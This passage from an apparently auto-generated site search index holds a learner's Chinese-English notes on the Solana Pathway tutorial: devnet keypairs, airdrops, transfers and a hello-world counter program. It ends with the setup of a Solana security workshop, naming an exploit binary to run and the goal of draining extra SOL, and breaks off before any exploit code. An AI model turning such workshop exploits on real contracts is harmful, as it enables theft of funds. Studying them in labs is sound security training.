be accessed in any way until the borrow expires // try_from_slice will mutably reference and deserialize the account.data greeting_account . counter += 1 ; greeting_account . serialize ( & mut & mut account . data . borrow_mut ()[ .. ]) ? ; // with the serialize(), the new counter value is sent back to Solana msg ! ( \"Greeted {} time(s)!\" , greeting_account . counter ); Ok (()) } \u5173\u4e8e greeting_account.serialize(&mut &mut account.data.borrow_mut()[..])?; serialize \u9700\u8981\u7c7b\u578b\u4e3a &mut W \u7684\u53c2\u6570\uff0c W \u5b9e\u73b0\u4e86 Write \u7279\u5f81\uff0c\u800c Write \u9700\u8981 &mut [u8] borrow_mut() \u8fd4\u56de RefMut<&mut [u8]> \uff0c\u63a5\u4e0b\u6765\u53d6\u53ef\u53d8\u5207\u7247 account.data.borrow_mut()[..] \u662f *(account.data.borrow_mut().index_mut(..)) \uff08 * \u6267\u884c\u89e3\u5f15\u7528\uff09\u7684\u8bed\u6cd5\u7cd6\uff0c .. \u662f RangeFull \u7684\u7b80\u5199\uff0c\u800c fn index_mut(&mut self, index: RangeFull) -> &mut Self::Output \uff0c\u5f97\u5230 [u8] \u5728\u67e5\u8be2\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u63a5\u6536\u8005\u53ef\u80fd\u4f1a\u81ea\u52a8\u89e3\u5f15\u7528\u6216\u501f\u7528\u53d8\u91cf\u6765\u8c03\u7528\u4e00\u4e2a\u65b9\u6cd5 1 \uff0c\u4f7f\u7528 greeting_account.serialize(&mut *account.data.borrow_mut())? \u662f\u7b49\u4ef7\u7684 Set up the Solana CLI \u00b6 1 2 3 4 5 $ solana config set --url https://api.devnet.solana.com $ mkdir solana-wallet $ solana-keygen new --outfile solana-wallet/keypair.json $ solana airdrop 1 $( solana-keygen pubkey solana-wallet/keypair.json ) $ solana account $( solana-keygen pubkey solana-wallet/keypair.json ) # check balance Deploy a Solana program \u00b6 1 2 3 4 5 # Build the program, running the following command from the project root directory $ yarn run solana:build:program # Deploy the program $ solana deploy -v --keypair solana-wallet/keypair.json dist/solana/program/helloworld.so # Default Signer Path: solana-wallet/keypair.json \u5f53\u90e8\u7f72\u4e00\u76f4\u5904\u5728\u7b49\u5f85\u72b6\u6001\u65f6\uff0c\u6ce8\u610f\u68c0\u67e5\u96c6\u7fa4\u7684\u7248\u672c\u662f\u5426\u4e0e CLI \u7684\u7248\u672c\u5339\u914d 2 1 $ solana cluster-version Challenge \u00b6 Get the publicKey of the programId and get its account info 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // pages/api/solana/deploy.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Connection , PublicKey } from '@solana/web3.js' ; import { getNodeURL } from '@figment-solana/lib' ; import path from 'path' ; import fs from 'mz/fs' ; const PROGRAM_PATH = path . resolve ( 'dist/solana/program' ); const PROGRAM_SO_PATH = path . join ( PROGRAM_PATH , 'helloworld.so' ); export default async function deploy ( req : NextApiRequest , res : NextApiResponse < string | boolean > , ) { try { const { network , programId } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); /***** START *****/ const publicKey = new PublicKey ( programId ); const programInfo = await connection . getAccountInfo ( publicKey ); /***** END *****/ if ( programInfo === null ) { if ( fs . existsSync ( PROGRAM_SO_PATH )) { throw new Error ( 'Program needs to be deployed with `solana program deploy`' , ); } else { throw new Error ( 'Program needs to be built and deployed' ); } } else if ( ! programInfo . executable ) { throw new Error ( `Program is not executable` ); } res . status ( 200 ). json ( true ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } \u53c2\u8003\u8d44\u6599 \u00b6 Cargo, crates and basic project structure - Learning Rust The question mark operator, ? Borrow operators rust - Trouble understanding &mut &mut reference - Stack Overflow Create storage for the program \u00b6 First, derive the greeter address from some values. Then create a transaction which instructs the blockchain to create the greeter account 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 // pages/api/solana/greeter.ts import { Connection , PublicKey , Keypair , SystemProgram , Transaction , sendAndConfirmTransaction , } from '@solana/web3.js' ; import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; import * as borsh from 'borsh' ; // The state of a greeting account managed by the hello world program class GreetingAccount { counter = 0 ; constructor ( fields : { counter : number } | undefined = undefined ) { if ( fields ) { this . counter = fields . counter ; } } } // Borsh schema definition for greeting accounts const GreetingSchema = new Map ([ [ GreetingAccount , { kind : 'struct' , fields : [[ 'counter' , 'u32' ]]}], ]); // The expected size of each greeting account. const GREETING_SIZE = borsh . serialize ( GreetingSchema , new GreetingAccount (), ). length ; type ResponseT = { hash : string ; greeter : string ; }; export default async function greeter ( req : NextApiRequest , res : NextApiResponse < string | ResponseT > , ) { try { const { network , secret , programId : programAddress } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const programId = new PublicKey ( programAddress ); const payer = Keypair . fromSecretKey ( new Uint8Array ( JSON . parse ( secret ))); const GREETING_SEED = 'hello' ; /***** START *****/ // Are there any methods from PublicKey to derive a public key from a seed? const greetedPubkey = await PublicKey . createWithSeed ( payer . publicKey , GREETING_SEED , programId ); // This function calculates the fees we have to pay to keep the newly // created account alive on the blockchain. We're naming it lamports because // that is the denomination of the amount being returned by the function. const lamports = await connection . getMinimumBalanceForRentExemption ( GREETING_SIZE , ); // Find which instructions are expected and complete SystemProgram with // the required arguments. const transaction = new Transaction (). add ( SystemProgram . createAccountWithSeed ({ basePubkey : payer.publicKey , // Base public key to use to derive the address of the created account fromPubkey : payer.publicKey , // The payer lamports , newAccountPubkey : greetedPubkey , // The created account programId , seed : GREETING_SEED , space : GREETING_SIZE })); // Complete this function call with the expected arguments. const hash = await sendAndConfirmTransaction ( connection , transaction , [ payer ]); /***** END *****/ res . status ( 200 ). json ({ hash : hash , greeter : greetedPubkey.toBase58 (), }); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } } Get data from the program \u00b6 First deserialize the greeter data to a TypeScript class, then access the counter value and pass it to the response object using the .json() method as in all previous tutorials 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // pages/api/solana/getter.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Connection , PublicKey } from '@solana/web3.js' ; import { getNodeURL } from '@figment-solana/lib' ; import * as borsh from 'borsh' ; // The state of a greeting account managed by the hello world program class GreetingAccount { counter = 0 ; constructor ( fields : { counter : number } | undefined = undefined ) { if ( fields ) { this . counter = fields . counter ; } } } // Borsh schema definition for greeting accounts const GreetingSchema = new Map ([ [ GreetingAccount , { kind : 'struct' , fields : [[ 'counter' , 'u32' ]]}], ]); export default async function getter ( req : NextApiRequest , res : NextApiResponse < string | number > , ) { try { const { network , greeter } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const greeterPublicKey = new PublicKey ( greeter ); const accountInfo = await connection . getAccountInfo ( greeterPublicKey ); if ( accountInfo === null ) { throw new Error ( 'Error: cannot find the greeted account' ); } /***** START *****/ // Find the expected parameters. const greeting = borsh . deserialize ( GreetingSchema , GreetingAccount , accountInfo . data ); // A little helper console . log ( greeting ); // Pass the counter to the client-side as JSON res . status ( 200 ). json ( greeting . counter ); /***** END *****/ } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; console . log ( errorMessage ); res . status ( 500 ). json ( errorMessage ); } } Send data to the program \u00b6 First you'll have to create an instruction, then you'll have to send and confirm a transaction to store the data from 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 // pages/api/solana/setter.ts import { Connection , PublicKey , Keypair , TransactionInstruction , Transaction , sendAndConfirmTransaction , } from '@solana/web3.js' ; import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; export default async function setter ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { greeter , secret , programId , network } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const greeterPublicKey = new PublicKey ( greeter ); const programKey = new PublicKey ( programId ); const payerSecretKey = new Uint8Array ( JSON . parse ( secret )); const payerKeypair = Keypair . fromSecretKey ( payerSecretKey ); /***** START *****/ const instruction = new TransactionInstruction ({ programId , keys : [{ pubkey : greeterPublicKey , isWritable : true , isSigner : false }] }); const hash = await sendAndConfirmTransaction ( connection , new Transaction (). add ( instruction ), [ payerKeypair ]); /***** END *****/ res . status ( 200 ). json ( hash ); } catch ( error ) { console . error ( error ); res . status ( 500 ). json ( 'Get balance failed' ); } } Method call expressions - The Rust Reference \u21a9 Ensure Versions Match \u21a9","title":"Solana Pathway"},{"location":"wargames/solana_pathway/#connect-to-solana","text":"Implement connect by creating a Connection instance and getting the API version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // pages/api/solana/connect.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; import { Connection } from '@solana/web3.js' ; export default async function connect ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { network } = req . body ; const url = getNodeURL ( network ); /***** START *****/ const connection = new Connection ( url ); const version = await connection . getVersion (); /***** END *****/ res . status ( 200 ). json ( version [ 'solana-core' ]); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Connect to Solana"},{"location":"wargames/solana_pathway/#create-an-account","text":"Implement keypair and parse the keypair to extract the address as a string 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // pages/api/solana/keypair.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Keypair } from '@solana/web3.js' ; type ResponseT = { secret : string ; address : string ; }; export default function keypair ( _req : NextApiRequest , res : NextApiResponse < string | ResponseT > , ) { try { /***** START *****/ const keypair = Keypair . generate (); // or //const keypair = new Keypair(); const address = keypair ? . publicKey . toString (); /***** END *****/ const secret = JSON . stringify ( Array . from ( keypair . secretKey )); res . status ( 200 ). json ({ secret , address , }); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Create an account"},{"location":"wargames/solana_pathway/#fund-the-account-with-sol","text":"Convert the address passed in the request body to a public key and use requestAirdrop to get 1 SOL 1 SOL is equal to 1,000,000,000 lamports . 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // pages/api/solana/fund.ts import { Connection , PublicKey , LAMPORTS_PER_SOL } from '@solana/web3.js' ; import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; export default async function fund ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { network , address } = req . body ; const url = getNodeURL ( network ); // confirmed \u5373\u5f53\u5757\u5df2\u901a\u8fc7 cluster \u8fbe\u5230 1 \u4e2a\u786e\u8ba4\u65f6\u53ef\u67e5\u8be2\u5230 const connection = new Connection ( url , 'confirmed' ); /***** START *****/ const publicKey = new PublicKey ( address ); const hash = await connection . requestAirdrop ( publicKey , LAMPORTS_PER_SOL ); await connection . confirmTransaction ( hash ); /***** END *****/ res . status ( 200 ). json ( hash ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Fund the account with SOL"},{"location":"wargames/solana_pathway/#anatomy-of-an-explorer-page","text":"Overview Account Input(s) \u53c2\u4e0e\u4ea4\u6613\u7684\u8d26\u6237 Instruction \u4ea4\u6613\u4e2d\u4f7f\u7528\u7684\u7a0b\u5e8f\u6307\u4ee4 Program Instruction Logs \u7a0b\u5e8f\u6267\u884c\u4e2d\u7684\u65e5\u5fd7\u8f93\u51fa","title":"Anatomy of an Explorer page"},{"location":"wargames/solana_pathway/#get-the-balance","text":"Implement publicKey & balance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // pages/api/solana/balance.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Connection , PublicKey } from '@solana/web3.js' ; import { getNodeURL } from '@figment-solana/lib' ; export default async function balance ( req : NextApiRequest , res : NextApiResponse < string | number > , ) { try { const { network , address } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); /***** START *****/ const publicKey = new PublicKey ( address ); // The balance is denominated in LAMPORTS const balance = await connection . getBalance ( publicKey ); /***** END *****/ if ( balance === 0 || balance === undefined ) { throw new Error ( 'Account not funded' ); } res . status ( 200 ). json ( balance ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Get the balance"},{"location":"wargames/solana_pathway/#transfer-some-sol","text":"Finish implementing the transfer() function \u82e5\u4e00\u4e2a\u8d26\u6237\u6301\u6709\u81f3\u5c11\u4e24\u5e74\u7684\u79df\u91d1\uff0c\u5219\u514d\u79df \u6240\u6709\u65b0\u8d26\u6237\u90fd\u9700\u8981\u6301\u6709\u81f3\u5c11\u4e24\u5e74\u7684\u79df\u91d1\uff0c\u82e5\u4ea4\u6613\u4f7f\u5f97\u8d26\u6237\u4f59\u989d\u5c0f\u4e8e\u6700\u5c0f\u503c\u5c06\u5931\u8d25 \u82e5\u8d26\u6237\u4f59\u989d\u4e3a 0\uff0c\u5c06\u88ab\u6e05\u9664 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 // pages/api/solana/transfer.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; import { Connection , PublicKey , SystemProgram , Transaction , sendAndConfirmTransaction , Keypair } from '@solana/web3.js' ; export default async function transfer ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { address , secret , recipient , lamports , network } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const fromPubkey = new PublicKey ( address ); const toPubkey = new PublicKey ( recipient ); // The secret key is stored in our state as a stringified array const secretKey = Uint8Array . from ( JSON . parse ( secret as string )); /***** START *****/ //... let's skip the beginning as it should be familiar for you by now! // Find the parameter to pass const instructions = SystemProgram . transfer ({ fromPubkey , toPubkey , lamports }); // How could you construct a signer array's const signers = [ Keypair . fromSecretKey ( secretKey )]; //const signers = [{publicKey: fromPubkey, secretKey}]; // \u5f53\u5c5e\u6027\u540d\u4e0e\u53d8\u91cf\u540d\u76f8\u540c\u65f6\uff0ce.g. name:name, \u53ef\u7b80\u5199\u4e3a name // Maybe adding something to a Transaction could be interesting ? const transaction = new Transaction (). add ( instructions ); // We can send and confirm a transaction in one row. const hash = await sendAndConfirmTransaction ( connection , transaction , signers ); /***** END *****/ res . status ( 200 ). json ( hash ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Transfer some SOL"},{"location":"wargames/solana_pathway/#_1","text":"Accounts | Solana Docs Objects | Property value shorthand","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/solana_pathway/#deploy-a-program","text":"","title":"Deploy a program"},{"location":"wargames/solana_pathway/#smart-contract-review","text":"a simple program, incrementing a number every time it's called use \u7c7b\u4f3c\u4e8e import 1 2 3 4 5 6 7 8 9 10 11 // The Rust source code for the program // contracts/solana/program/src/lib.rs use borsh ::{ BorshDeserialize , BorshSerialize }; // borsh: Binary Object Representation Serializer for Hashing use solana_program ::{ account_info ::{ next_account_info , AccountInfo }, entrypoint , entrypoint :: ProgramResult , msg , // for low-impact logging on the blockchain program_error :: ProgramError , pubkey :: Pubkey , }; \u5229\u7528\u6d3e\u751f\uff08 derive \uff09\u5b8f\u5728\u7f16\u8bd1\u65f6\u751f\u6210\u7ed3\u6784\u4f53 GreetingAccount \u5fc5\u9700\u7684\u6837\u677f\u4ee3\u7801 1 2 3 4 5 6 /// Define the type of state stored in accounts #[derive(BorshSerialize, BorshDeserialize, Debug)] pub struct GreetingAccount { /// number of greetings pub counter : u32 , } \u5b9a\u4e49\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9 ? \u53ea\u80fd\u7528\u4e8e\u8fd4\u56de Result \u7684\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // Declare and export the program's entrypoint entrypoint ! ( process_instruction ); // Program entrypoint's implementation pub fn process_instruction ( program_id : & Pubkey , // Public key of the account the hello world program was loaded into accounts : & [ AccountInfo ], // The account to say hello to _instruction_data : & [ u8 ], // Ignored, all helloworld instructions are hellos ) -> ProgramResult { // print messages to the Program Log with the msg!() macro // rather than use println!() which would be prohibitive in terms of computational cost for the network. msg ! ( \"Hello World Rust program entrypoint\" ); // Iterating accounts is safer than indexing let accounts_iter = & mut accounts . iter (); // accounts_iter takes a mutable reference of each values in accounts // Get the account to say hello to let account = next_account_info ( accounts_iter ) ? ; // Will return the next AccountInfo or a NotEnoughAccountKeys error // ? is a shortcut expression for error propagation // The account must be owned by the program in order to modify its data // \u9664\u6240\u6709\u8005\u5916\uff0c\u5176\u4ed6\u4eba\u65e0\u6743\u4fee\u6539\u6570\u636e\u8d26\u6237\u7684\u72b6\u6001 if account . owner != program_id { msg ! ( \"Greeted account does not have the correct program id\" ); return Err ( ProgramError :: IncorrectProgramId ); } // Increment and store the number of times the account has been greeted let mut greeting_account = GreetingAccount :: try_from_slice ( & account . data . borrow ()) ? ; // borrow operator & // shared borrow &: the place may not be mutated, but it may be read or shared again // mutable borrow &mut: the place may not be accessed in any way until the borrow expires // try_from_slice will mutably reference and deserialize the account.data greeting_account . counter += 1 ; greeting_account . serialize ( & mut & mut account . data . borrow_mut ()[ .. ]) ? ; // with the serialize(), the new counter value is sent back to Solana msg ! ( \"Greeted {} time(s)!\" , greeting_account . counter ); Ok (()) } \u5173\u4e8e greeting_account.serialize(&mut &mut account.data.borrow_mut()[..])?; serialize \u9700\u8981\u7c7b\u578b\u4e3a &mut W \u7684\u53c2\u6570\uff0c W \u5b9e\u73b0\u4e86 Write \u7279\u5f81\uff0c\u800c Write \u9700\u8981 &mut [u8] borrow_mut() \u8fd4\u56de RefMut<&mut [u8]> \uff0c\u63a5\u4e0b\u6765\u53d6\u53ef\u53d8\u5207\u7247 account.data.borrow_mut()[..] \u662f *(account.data.borrow_mut().index_mut(..)) \uff08 * \u6267\u884c\u89e3\u5f15\u7528\uff09\u7684\u8bed\u6cd5\u7cd6\uff0c .. \u662f RangeFull \u7684\u7b80\u5199\uff0c\u800c fn index_mut(&mut self, index: RangeFull) -> &mut Self::Output \uff0c\u5f97\u5230 [u8] \u5728\u67e5\u8be2\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u63a5\u6536\u8005\u53ef\u80fd\u4f1a\u81ea\u52a8\u89e3\u5f15\u7528\u6216\u501f\u7528\u53d8\u91cf\u6765\u8c03\u7528\u4e00\u4e2a\u65b9\u6cd5 1 \uff0c\u4f7f\u7528 greeting_account.serialize(&mut *account.data.borrow_mut())? \u662f\u7b49\u4ef7\u7684","title":"Smart contract review"},{"location":"wargames/solana_pathway/#set-up-the-solana-cli","text":"1 2 3 4 5 $ solana config set --url https://api.devnet.solana.com $ mkdir solana-wallet $ solana-keygen new --outfile solana-wallet/keypair.json $ solana airdrop 1 $( solana-keygen pubkey solana-wallet/keypair.json ) $ solana account $( solana-keygen pubkey solana-wallet/keypair.json ) # check balance","title":"Set up the Solana CLI"},{"location":"wargames/solana_pathway/#deploy-a-solana-program","text":"1 2 3 4 5 # Build the program, running the following command from the project root directory $ yarn run solana:build:program # Deploy the program $ solana deploy -v --keypair solana-wallet/keypair.json dist/solana/program/helloworld.so # Default Signer Path: solana-wallet/keypair.json \u5f53\u90e8\u7f72\u4e00\u76f4\u5904\u5728\u7b49\u5f85\u72b6\u6001\u65f6\uff0c\u6ce8\u610f\u68c0\u67e5\u96c6\u7fa4\u7684\u7248\u672c\u662f\u5426\u4e0e CLI \u7684\u7248\u672c\u5339\u914d 2 1 $ solana cluster-version","title":"Deploy a Solana program"},{"location":"wargames/solana_pathway/#challenge","text":"Get the publicKey of the programId and get its account info 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // pages/api/solana/deploy.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Connection , PublicKey } from '@solana/web3.js' ; import { getNodeURL } from '@figment-solana/lib' ; import path from 'path' ; import fs from 'mz/fs' ; const PROGRAM_PATH = path . resolve ( 'dist/solana/program' ); const PROGRAM_SO_PATH = path . join ( PROGRAM_PATH , 'helloworld.so' ); export default async function deploy ( req : NextApiRequest , res : NextApiResponse < string | boolean > , ) { try { const { network , programId } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); /***** START *****/ const publicKey = new PublicKey ( programId ); const programInfo = await connection . getAccountInfo ( publicKey ); /***** END *****/ if ( programInfo === null ) { if ( fs . existsSync ( PROGRAM_SO_PATH )) { throw new Error ( 'Program needs to be deployed with `solana program deploy`' , ); } else { throw new Error ( 'Program needs to be built and deployed' ); } } else if ( ! programInfo . executable ) { throw new Error ( `Program is not executable` ); } res . status ( 200 ). json ( true ); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Challenge"},{"location":"wargames/solana_pathway/#_2","text":"Cargo, crates and basic project structure - Learning Rust The question mark operator, ? Borrow operators rust - Trouble understanding &mut &mut reference - Stack Overflow","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/solana_pathway/#create-storage-for-the-program","text":"First, derive the greeter address from some values. Then create a transaction which instructs the blockchain to create the greeter account 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 // pages/api/solana/greeter.ts import { Connection , PublicKey , Keypair , SystemProgram , Transaction , sendAndConfirmTransaction , } from '@solana/web3.js' ; import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; import * as borsh from 'borsh' ; // The state of a greeting account managed by the hello world program class GreetingAccount { counter = 0 ; constructor ( fields : { counter : number } | undefined = undefined ) { if ( fields ) { this . counter = fields . counter ; } } } // Borsh schema definition for greeting accounts const GreetingSchema = new Map ([ [ GreetingAccount , { kind : 'struct' , fields : [[ 'counter' , 'u32' ]]}], ]); // The expected size of each greeting account. const GREETING_SIZE = borsh . serialize ( GreetingSchema , new GreetingAccount (), ). length ; type ResponseT = { hash : string ; greeter : string ; }; export default async function greeter ( req : NextApiRequest , res : NextApiResponse < string | ResponseT > , ) { try { const { network , secret , programId : programAddress } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const programId = new PublicKey ( programAddress ); const payer = Keypair . fromSecretKey ( new Uint8Array ( JSON . parse ( secret ))); const GREETING_SEED = 'hello' ; /***** START *****/ // Are there any methods from PublicKey to derive a public key from a seed? const greetedPubkey = await PublicKey . createWithSeed ( payer . publicKey , GREETING_SEED , programId ); // This function calculates the fees we have to pay to keep the newly // created account alive on the blockchain. We're naming it lamports because // that is the denomination of the amount being returned by the function. const lamports = await connection . getMinimumBalanceForRentExemption ( GREETING_SIZE , ); // Find which instructions are expected and complete SystemProgram with // the required arguments. const transaction = new Transaction (). add ( SystemProgram . createAccountWithSeed ({ basePubkey : payer.publicKey , // Base public key to use to derive the address of the created account fromPubkey : payer.publicKey , // The payer lamports , newAccountPubkey : greetedPubkey , // The created account programId , seed : GREETING_SEED , space : GREETING_SIZE })); // Complete this function call with the expected arguments. const hash = await sendAndConfirmTransaction ( connection , transaction , [ payer ]); /***** END *****/ res . status ( 200 ). json ({ hash : hash , greeter : greetedPubkey.toBase58 (), }); } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; res . status ( 500 ). json ( errorMessage ); } }","title":"Create storage for the program"},{"location":"wargames/solana_pathway/#get-data-from-the-program","text":"First deserialize the greeter data to a TypeScript class, then access the counter value and pass it to the response object using the .json() method as in all previous tutorials 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // pages/api/solana/getter.ts import type { NextApiRequest , NextApiResponse } from 'next' ; import { Connection , PublicKey } from '@solana/web3.js' ; import { getNodeURL } from '@figment-solana/lib' ; import * as borsh from 'borsh' ; // The state of a greeting account managed by the hello world program class GreetingAccount { counter = 0 ; constructor ( fields : { counter : number } | undefined = undefined ) { if ( fields ) { this . counter = fields . counter ; } } } // Borsh schema definition for greeting accounts const GreetingSchema = new Map ([ [ GreetingAccount , { kind : 'struct' , fields : [[ 'counter' , 'u32' ]]}], ]); export default async function getter ( req : NextApiRequest , res : NextApiResponse < string | number > , ) { try { const { network , greeter } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const greeterPublicKey = new PublicKey ( greeter ); const accountInfo = await connection . getAccountInfo ( greeterPublicKey ); if ( accountInfo === null ) { throw new Error ( 'Error: cannot find the greeted account' ); } /***** START *****/ // Find the expected parameters. const greeting = borsh . deserialize ( GreetingSchema , GreetingAccount , accountInfo . data ); // A little helper console . log ( greeting ); // Pass the counter to the client-side as JSON res . status ( 200 ). json ( greeting . counter ); /***** END *****/ } catch ( error ) { let errorMessage = error instanceof Error ? error . message : 'Unknown Error' ; console . log ( errorMessage ); res . status ( 500 ). json ( errorMessage ); } }","title":"Get data from the program"},{"location":"wargames/solana_pathway/#send-data-to-the-program","text":"First you'll have to create an instruction, then you'll have to send and confirm a transaction to store the data from 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 // pages/api/solana/setter.ts import { Connection , PublicKey , Keypair , TransactionInstruction , Transaction , sendAndConfirmTransaction , } from '@solana/web3.js' ; import type { NextApiRequest , NextApiResponse } from 'next' ; import { getNodeURL } from '@figment-solana/lib' ; export default async function setter ( req : NextApiRequest , res : NextApiResponse < string > , ) { try { const { greeter , secret , programId , network } = req . body ; const url = getNodeURL ( network ); const connection = new Connection ( url , 'confirmed' ); const greeterPublicKey = new PublicKey ( greeter ); const programKey = new PublicKey ( programId ); const payerSecretKey = new Uint8Array ( JSON . parse ( secret )); const payerKeypair = Keypair . fromSecretKey ( payerSecretKey ); /***** START *****/ const instruction = new TransactionInstruction ({ programId , keys : [{ pubkey : greeterPublicKey , isWritable : true , isSigner : false }] }); const hash = await sendAndConfirmTransaction ( connection , new Transaction (). add ( instruction ), [ payerKeypair ]); /***** END *****/ res . status ( 200 ). json ( hash ); } catch ( error ) { console . error ( error ); res . status ( 500 ). json ( 'Get balance failed' ); } } Method call expressions - The Rust Reference \u21a9 Ensure Versions Match \u21a9","title":"Send data to the program"},{"location":"wargames/solana_security_workshop/","tags":["web3","blockchain","smart contract","solana","rust"],"text":"#web3 #blockchain #smart contract #solana #rust .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Setup - Full \u00b6 1 2 $ docker run --name breakpoint-workshop -p 2222 :22 -p 8383 :80 -e PASSWORD = \"password\" neodymelabs/breakpoint-workshop:latest-code-prebuilt # visit http://localhost:8383 Compiling the Contracts and Running the Exploits \u00b6 PoC \u6846\u67b6\u4ee3\u7801\u4f4d\u4e8e pocs \u76ee\u5f55\u4e0b VSCode \u4e2d Ctrl+Shift+B \u518d\u9009\u62e9 level \u6216\u901a\u8fc7\u547d\u4ee4\u884c\u7684\u65b9\u5f0f 1 2 3 4 5 # compile all contracts cargo build-bpf --workspace # run level0 exploit RUST_BACKTRACE = 1 cargo run --bin level0 Docker \u5185\u6709\u90e8\u5206\u547d\u4ee4\u7f3a\u5931\uff08e.g. bash >m<\uff09\u53ef\u80fd\u5bfc\u81f4\u6784\u5efa\u5931\u8d25\uff0c\u53ef\u5728\u672c\u5730\u6784\u5efa\u540e\u4e0a\u4f20 Exploit Outline \u00b6 \u521d\u59cb\u6301\u6709 1 SOL\uff0c\u76ee\u6807\u662f\u83b7\u5f97\u66f4\u591a\u7684 SOL Level 0 - A First Vulnerability \u00b6 \u67e5\u770b WalletInstruction \uff0c\u521d\u6b65\u4e86\u89e3\u7a0b\u5e8f\u7684\u529f\u80fd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 